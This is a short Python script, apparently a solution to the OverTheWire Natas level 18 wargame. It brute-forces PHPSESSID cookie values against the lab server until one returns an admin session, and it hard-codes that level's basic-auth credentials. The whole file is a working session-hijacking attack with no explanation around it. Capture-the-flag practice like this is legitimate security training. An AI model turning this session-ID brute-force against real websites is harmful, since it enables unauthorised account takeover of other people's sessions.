import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

uri="http://natas18.natas.labs.overthewire.org/index.php"

for i in range(0,640):
    payload=dict(PHPSESSID=str(i))
    r = requests.post(uri,cookies=payload,auth=Auth)
    if i % 10 == 0:
        print("{} - still going".format(i,r.status_code))
    if "You are an admin" in r.text:
        print("Session found: {}".format(i))
        print(r.text)
        break
